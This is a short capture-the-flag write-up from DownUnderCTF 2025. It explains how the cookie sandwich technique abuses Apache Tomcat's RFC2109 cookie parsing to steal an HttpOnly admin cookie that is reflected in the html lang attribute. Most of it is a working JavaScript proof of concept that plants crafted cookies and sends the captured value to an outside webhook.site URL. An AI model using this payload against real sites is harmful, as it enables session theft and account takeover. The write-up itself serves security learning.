## TLDR

The challenge is about using the cookie sandwich technique from [Zakhar Fedotkin](https://portswigger.net/research/stealing-httponly-cookies-with-the-cookie-sandwich-technique) to steal HttpOnly cookies. This is possible because the application is running on Apache Tomcat, which falls back to RFC2109 parsing if the cookie starts with `$Version=1`.

![cookie sandwich](/CTF-writeups/2025/downunderctf-2025/cookie-sandwich.png)

To exfiltrate the admin cookie, we need to find an endpoint that reflects cookie values. There are multiple XSSs in the challenge but the solution is to use the `language` cookie which is reflected in the html lang attribute.

## PoC

```html
<script>
async function sandwich(target, cookie) {
    const iframe = document.createElement('iframe');

    const url = new URL(target);
    const domain = url.hostname;
    const path = url.pathname;

    iframe.src = target;
    iframe.style.display = 'none';
    document.body.appendChild(iframe);
    iframe.onload = async () => {
        document.cookie = `$Version=1; domain=${domain}; path=${path};`;
        document.cookie = `${cookie}="FOO; domain=${domain}; path=${path};`;
        document.cookie = `dummy=qaz"; domain=${domain}; path=/;`;
        try {
            const response = await fetch(`${target}`, {
                credentials: 'include',
            });
            const responseData = await response.text();
            const regex = /<html[^>]*>/;
            // const regex = /<html lang="([^"]*)">/;
            const match = responseData.match(regex);

            window.location.href = 'http://webhook.site/8aa41a0a-ce2d-46e5-83a8-9d1616e33f03/' + btoa(match[0]);

        } catch (error) {
        }
    };
}

setTimeout(sandwich, 100, 'http://127.0.0.1:8080/index.jsp', 'language');
</script>
```

Flag: DUCTF{1_th0ught_y0u_c0uldnt_st34l_th3m}


Solved by: benkyou